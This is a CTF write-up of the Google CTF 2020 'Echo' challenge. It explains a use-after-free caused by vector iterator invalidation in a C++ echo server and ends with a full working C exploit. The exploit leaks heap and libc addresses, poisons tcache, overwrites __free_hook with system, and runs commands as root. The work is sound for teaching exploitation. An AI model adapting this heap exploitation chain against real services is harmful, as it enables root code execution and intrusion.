---
layout: post
category: Pwn
title: Google CTF Quals 2020 - Echo
tags: 
    - kowu
---

# Challenge overwiew

The challenge itself was an "echo service" written in C++, listening for connections on localhost. To interact with it on the remote end, it was necessary to upload a binary to the launcher service, which executed the received binary "in memory".
The echo service itself was running as root, therefore we need to pwn it to get the flag. The functionality of the service was simple:

1. Receive and store data in a std::string until a newline char occurred
2. Echo the data back

[Download](/assets/bin/google_echo.zip)


# The bug

The echo service is relying heavily on select for multiplexing IO. The mainloop of the service can be seen below.

```c++
int ret = select(max_fd + 1, &readset, &writeset, nullptr, nullptr);
if (ret > 0) {
    if (FD_ISSET(listen_fd, &readset)) {
        handle_new_connections(listen_fd);
    }

    for (auto it = clients.begin(), end = clients.end(); it != end; ++it) {
        ClientCtx& client = *it;
        const int fd = client.fd;

        if (FD_ISSET(fd, &readset)) {
            if (!handle_read(client)) {
                close(fd);
                it = clients.erase(it);
                continue;
            }
        } else if (FD_ISSET(fd, &writeset)) {
            if (!handle_write(client)) {
                close(fd);
                it = clients.erase(it);
                continue;
            }
        }
    }
} else if (ret < 0 && errno != EINTR) {
    err(1, "select");
}
```

The loop iterating through all clients is faulty. Inside the loop the client vector is being modified (by erasing clients), which invalidates all existing iterators of it and yields a new one.
However, the `end` iterator is still being used afterwards to check if the iteration is done! This allows iterating "out of bounds" and will lead to a use-after-free condition.
There is only one catch - timing needs to be correct. During one select call a connection must be closed and on another connection a read/write must occurr to work on the out of bound client elements.


As I am not very familiar with C++ internals, and couldn't trigger the bug on the first try, I tried it by writing a simple python "fuzzer". It would randomly open connections / send something / close connections.
Source for the echo service was provided, so I compiled it with ASAN using `CXXFLAGS = -fsanitize=address -O1 -g -fno-omit-frame-pointer`. After a few minutes I got a nice UAF write, with controllable size and data.
```c++
=================================================================
==6435==ERROR: AddressSanitizer: heap-use-after-free on address 0x604000000090 at pc 0x5555555dd3eb bp 0x7fffffffd590 sp 0x7fffffffcd40
WRITE of size 4 at 0x604000000090 thread T0
    #0 0x5555555dd3ea in __interceptor_memcpy.part.0 (/home/user/ctf/google/echo/echo_srv+0x893ea)
    #1 0x7ffff7edb9b0 in std::char_traits<char>::copy(char*, char const*, unsigned long) /build/gcc/src/gcc-build/x86_64-pc-linux-gnu/libstdc++-v3/include/bits/char_traits.h:395:49
    #2 0x7ffff7edb9b0 in std::__cxx11::basic_string<char, std::char_traits<char>, std::allocator<char> >::_S_copy(char*, char const*, unsigned long) /build/gcc/src/gcc-build/x86_64-pc-linux-gnu/libstdc++-v3/include/bits/basic_string.h:351:21
    #3 0x7ffff7edb9b0 in std::__cxx11::basic_string<char, std::char_traits<char>, std::allocator<char> >::_S_copy(char*, char const*, unsigned long) /build/gcc/src/gcc-build/x86_64-pc-linux-gnu/libstdc++-v3/include/bits/basic_string.h:346:7
    #4 0x7ffff7edb9b0 in std::__cxx11::basic_string<char, std::char_traits<char>, std::allocator<char> >::_M_append(char const*, unsigned long) /build/gcc/src/gcc-build/x86_64-pc-linux-gnu/libstdc++-v3/include/bits/basic_string.tcc:367:19
    #5 0x55555564e6d6 in handle_read(ClientCtx&) /home/user/ctf/google/echo/echo_srv.cc:95:21
    #6 0x55555564f25a in main /home/user/ctf/google/echo/echo_srv.cc:170:16
    #7 0x7ffff7a66151 in __libc_start_main (/usr/lib/libc.so.6+0x28151)
    #8 0x55555557551d in _start (/home/user/ctf/google/echo/echo_srv+0x2151d)

0x604000000090 is located 0 bytes inside of 33-byte region [0x604000000090,0x6040000000b1)
freed by thread T0 here:
    #0 0x5555556183a9 in free (/home/user/ctf/google/echo/echo_srv+0xc43a9)
    #1 0x55555564f63d in ClientCtx::~ClientCtx() /home/user/ctf/google/echo/echo_srv.cc:26:8
    #2 0x5555556511cb in void __gnu_cxx::new_allocator<ClientCtx>::destroy<ClientCtx>(ClientCtx*) /usr/bin/../lib64/gcc/x86_64-pc-linux-gnu/10.2.0/../../../../include/c++/10.2.0/ext/new_allocator.h:156:10
    #3 0x5555556511b8 in void std::allocator_traits<std::allocator<ClientCtx> >::destroy<ClientCtx>(std::allocator<ClientCtx>&, ClientCtx*) /usr/bin/../lib64/gcc/x86_64-pc-linux-gnu/10.2.0/../../../../include/c++/10.2.0/bits/alloc_traits.h:531:8
    #4 0x555555651a40 in std::vector<ClientCtx, std::allocator<ClientCtx> >::_M_erase(__gnu_cxx::__normal_iterator<ClientCtx*, std::vector<ClientCtx, std::allocator<ClientCtx> > >) /usr/bin/../lib64/gcc/x86_64-pc-linux-gnu/10.2.0/../../../../include/c++/10.2.0/bits/vector.tcc:177:7
    #5 0x55555564feea in std::vector<ClientCtx, std::allocator<ClientCtx> >::erase(__gnu_cxx::__normal_iterator<ClientCtx const*, std::vector<ClientCtx, std::allocator<ClientCtx> > >) /usr/bin/../lib64/gcc/x86_64-pc-linux-gnu/10.2.0/../../../../include/c++/10.2.0/bits/stl_vector.h:1431:16
    #6 0x55555564f29d in main /home/user/ctf/google/echo/echo_srv.cc:172:26
    #7 0x7ffff7a66151 in __libc_start_main (/usr/lib/libc.so.6+0x28151)

previously allocated by thread T0 here:
    #0 0x5555556186d9 in malloc (/home/user/ctf/google/echo/echo_srv+0xc46d9)
    #1 0x7ffff7e3f539 in operator new(unsigned long) /build/gcc/src/gcc/libstdc++-v3/libsupc++/new_op.cc:50:22

SUMMARY: AddressSanitizer: heap-use-after-free (/home/user/ctf/google/echo/echo_srv+0x893ea) in __interceptor_memcpy.part.0
```
At this point I minimized the "trigger sequence" of commands and ported it to C code (necessary later on because launcher service would expect an executable, also we get better timings).
Somehow `sched_yield` did not work for me guaranteeing that the server processed all data, however sleeping for one millisecond with `usleep` would. I came up with the following UAF write reproducer, which would write into the freed c1 heap chunk:
```c
#define yield() usleep(1000)

int conn() {
    //open connection on localhost:21337
}

int main() {
    int c1, c2;
    
    c1 = conn();
    yield();
    c2 = conn();
    write(c1, "AAAA...", 0x20);
    write(c2, "BBBB...", 0x20);
    yield();
    
    write(c2, "uafw", 4);
    close(c1);
    yield();
    
    return 0;
}
```
To be honest, I don't know HOW this write can happen, it is somehow working on c2's fd, but at the same time accesses c1's reading buffer. I still might not fully understand C++ Vectors / Iterators internals. Will investigate this later, but during the CTF noone cares, as long as the exploitation primitive is stable, right? And as I could write into freed tcache chunks, I had a powerful primitive by corrupting tcache freelist pointers.


This is basically an arbitrary write primitive I will make heavy use of (aka tcache poisoning), and one should be familiar with it. [Tcache poisoning Example](https://github.com/shellphish/how2heap/blob/master/glibc_2.26/tcache_poisoning.c)

At least it was instant arbitrary write back then when the Google CTF took place, there now is a new mitigation introduced (at least on my distro) to prevent this happening that easily [tcache/fastbin Safe-Linking](https://patchwork.ozlabs.org/project/glibc/patch/CAA=iMULaUiUjsx2myeMRvEmgQav915HWmqG5iz3_P9EeMdW_Yw@mail.gmail.com/).

# Leaking Addresses

The echo service was compiled with ASLR enabled, so I first needed to get my hands on some addresses. At first I tried to construct a uaf read by filling up kernel buffers and timing read / close operations precisely. With no success, so another option was considered.
The plan was the following:

1. Create sufficient connections to work with
2. Allocate a huge 0x10000 memory area by sending 0x10000 Bytes
3. Fill up holes caused by string reallocations
4. Create three small 0x30 sized allocations
5. Free one small allocation to place its address into the tcache
6. Trigger the bug, write one nullbyte (will partially overwrite a pointer of the next free tcache entry with two nullbytes)
7. Allocate overwritten tcache entry (malloc will now (most likely) return an address pointing into the huge 0x10000 chunk)
8. Free the entry again (because of some recently added tcache double free checks, the freed chunk will contain a tcache context pointer, aka. a pointer to the start of the heap)
9. Write a newline to the huge memory area, which will trigger sending it back
10. Read it in and search for the heap pointer

The heap state after steps 1-6 is pictured below. The freed allocation of step 5 is marked in red. Above it, the orange chunk is a part of the 0x10000 memory region. The green chunk is the uaf chunk.
After triggering the bug, the tcache pointer inside the uaf chunk, which previously pointed at the red chunk, is partially overwritten with nullbytes (as shown by the blue rectangle). Note the 0x55555555d010 address in every freed chunk, it points to the tcache context and therefore the beginning of the heap.

![image](http://blog.redrocket.club/assets/img/echo_leak1.png)

If everything worked as expected, after step 8 one can find the following in memory. The orange chunk is the 0x10000 region, red is the allocated / freed chunk. Now I just needed to echo this data back.

![image](http://blog.redrocket.club/assets/img/echo_leak2.png)

As the Heap was now derandomized, next up I wanted to leak some libc addresses. To achieve this I did the following:

1. Trigger the bug again to create a 0x30 allocation overlapping with the header of a 0x810 allocation (already exists from previously filling up memory holes)
2. Free the 0x810 allocation, the free operation will overwrite parts of the 0x30 chunk. As the freed chunk is huge, it will leak unsorted bin pointers (aka pointers to a static position inside libc)
3. Writing a newline to the 0x30 chunk will return those leaks
4. Read them in and calculate libc base

The heap state after step 2 is shown below. The huge chunk (green) is freed, and doing so leaked addresses into the red 0x30 chunk, which is still under my control.

![image](http://blog.redrocket.club/assets/img/echo_leak3.png)


# Getting RCE

With the libc address and an arbitrary write primitive at hand, the challenge is now really easy to solve. I did the following:

1. Trigger the bug one last time to fake a 0x30 chunk on libc.__free_hook
2. Overwrite the free hook with libc.system
3. Create a new connection and write some commands for system to execute into it
4. Close the connection (will free the memory and therefore call system)
5. Profit

I just copied the flag from /root/flag into /tmp and made it world readable. My exploit also spawns a shell when it is finished, so I could just cat the flag.

```
[+] Opening connection to echo.2020.ctfcompetition.com on port 1337: Done
[*] sending
[*] Switching to interactive mode
 
heapbase located at: 0x55ea3a33b010
leaked: 0 71 7f44b94dc0d0 7f44b94dc0d0
libc located at: 0x7f44b92f0000
$ cat /tmp/flag
CTF{to0_m4ny_c0nn3ct1ons_Ar3_4_Problem_5ometime5}
$ 
```

# Final exploit

Python launch script
```py
from pwn import *

r = remote('echo.2020.ctfcompetition.com', 1337)
f = open('sploit', 'rb').read()
r.sendafter('ELF:', p32(len(f)) + f)
r.interactive()
```

Exploit compiled with `clang -D_GNU_SOURCE -static -O2 sploit.c -o sploit`
```c
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

#include <string.h>
#include <arpa/inet.h>

#define OFFSET_HEAP 0x12f50
#define OFFSET_LIBC 0x1ec0d0
#define OFFSET_FREE_HOOK 0x1eeb28
#define OFFSET_SYSTEM 0x55410

#define yield() usleep(1000)

int conn() {
    int sockfd;
    struct sockaddr_in servaddr;

    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd == -1) {
        puts("socket creation failed...");
        exit(0);
    }

    bzero(&servaddr, sizeof(servaddr));

    servaddr.sin_family = AF_INET;
    servaddr.sin_addr.s_addr = inet_addr("127.0.0.1");
    servaddr.sin_port = htons(21337);

    if (connect(sockfd, (const struct sockaddr *) &servaddr, sizeof(servaddr)) != 0) {
        puts("connection with the server failed...");
        exit(0);
    }

    return sockfd;
}

void writeall(int fd, char *buf, size_t len) {
    size_t towrite = len;
    while (towrite) {
        ssize_t written = write(fd, buf, towrite);
        if (written <= 0) {
            puts("write failure");
            exit(0);
        }
        towrite -= written;
    }
}

void readall(int fd, char *buf, size_t len) {
    size_t toread = len;
    while (toread) {
        ssize_t readden = read(fd, buf, toread);
        if (readden <= 0) {
            puts("read failure");
            exit(0);
        }
        toread -= readden;
    }
}

int main() {
    unsigned i;
    int conns[16];
    char *chunk = malloc(0x10000);

    // open connections
    for (i = 0; i < 16; i++) {
        conns[i] = conn();
        yield();
    }

    // fake 0x10000 area, fill with 0x31 to bypass some tcache checks later on
    for (i = 1; i < 0x10000u / 8; i+=2) {
        ((size_t*)chunk)[i] = 0x31;
    }
    writeall(conns[0], chunk, 0x10000 - 1);
    yield();

    // fill up remaining chunks 1 to 9
    for (i = 1; i < 9; i++) {
        writeall(conns[i], chunk, 0x10000u >> i);
        yield();
    }

    // allocate 3 0x30 chunks, A chunk right behind the 0x10000 area
    write(conns[13], "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA", 0x20);
    yield();
    write(conns[14], "BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB", 0x20);
    write(conns[15], "CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC", 0x20);
    yield();

    // close A buffer, places pointer to it in tcache freelist head
    close(conns[13]);
    yield();

    // bug: free B, and auf write two nullbytes into free'd B memory.
    // partially overwrites tcaches next pointer pointing to A.
    write(conns[15], "\0", 1);
    close(conns[14]);
    yield();

    // allocate two 0x30 chunks, Y is likely to be placed inside the 0x10000 area
    conns[13] = conn();
    conns[14] = conn();
    write(conns[13], "XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX", 0x20);
    yield();
    write(conns[14], "YYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYY", 0x20);
    yield();

    // free Y chunk, writes heap base into 0x10000 area
    close(conns[14]);
    yield();

    // read the buffer back in by sending '\n'
    write(conns[0], "\n", 1);
    // skip the hello message, linus would insult me for writing this code
    do {
        read(conns[0], chunk, 1);
    } while(*chunk != '\n');
    readall(conns[0], chunk, 0x10000);

    // search for heap address
    size_t *leak = memmem(chunk, 0x10000, "YYYYYYYY", 8);
    if (!leak) {
        puts("heapbase not found :(");
        exit(0);
    }
    size_t heapbase = leak[-1];
    printf("heapbase located at: 0x%lx\n", heapbase);

    // shape tcache / heap so there is at least one free entry before the bug is triggered again
    close(conns[15]);
    close(conns[13]);
    yield();
    conns[13] = conn();
    yield();
    conns[14] = conn();
    yield();
    conns[15] = conn();
    write(conns[13], "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA", 0x20);
    write(conns[14], "BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB", 0x20);
    write(conns[15], "CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC", 0x20);
    yield();
    close(conns[13]);
    yield();

    // bug again: overwrite tcache pointer
    size_t addr = heapbase + OFFSET_HEAP;
    write(conns[15], &addr, 7);
    close(conns[14]);
    yield();

    // allocates fake chunk over filler chunk 5's header
    conns[13] = conn();
    conns[14] = conn();
    write(conns[13], "XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX", 0x20);
    ((size_t*)chunk)[0] = 0;
    ((size_t*)chunk)[1] = 0x811;
    ((size_t*)chunk)[2] = 0;
    ((size_t*)chunk)[3] = 0;
    write(conns[14], chunk, 0x20);
    yield();

    // free chunk 5
    write(conns[5], "\n", 1);
    yield();

    // trigger a realloc (because heap is overlapping, this will lead to problems) and send leaked data out
    write(conns[14], "YYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYY\n", 0x40);
    yield();

    // read in the libc leak
    do {
        read(conns[14], chunk, 1);
    } while(*chunk != '\n');
    read(conns[14], chunk, 0x20);
    leak = (size_t*)chunk;
    if (leak[1] == 0x811) {
        puts("libc leak not found :(");
        exit(0);
    }
    printf("leaked: %lx %lx %lx %lx\n", leak[0], leak[1], leak[2], leak[3]);
    size_t libcbase = leak[2] -= OFFSET_LIBC;
    printf("libc located at: 0x%lx\n", libcbase);

    // prepare to trigger the bug one last time...
    int x, y, z;
    x = conn();
    yield();
    y = conn();
    yield();
    z = conn();
    yield();
    write(x, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA", 0x20);
    write(y, "BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB", 0x20);
    write(z, "CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC", 0x20);
    yield();
    close(x);
    yield();

    // bug again: overwrite tcache pointer to point at free hook
    addr = libcbase + OFFSET_FREE_HOOK;
    write(z, &addr, 7);
    close(y);
    yield();

    // get chunk overlapping the free hook, overwrite it with system
    write(conns[10], "XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX", 0x20);
    yield();
    memset(chunk, 0, 0x20);
    *(size_t*)chunk = libcbase + OFFSET_SYSTEM;
    write(conns[11], chunk, 0x20);
    yield();

    // create chunk with command to be executed
    x = conn();
    write(x, "/bin/cp /root/flag /tmp; /bin/chmod a+r /tmp/flag\0", 0x50);
    // free the chunk, executes the command as root
    close(x);

    // we can now cat /tmp/flag
    fflush(stdout);
    system("/bin/sh");
    return 0;
}
```
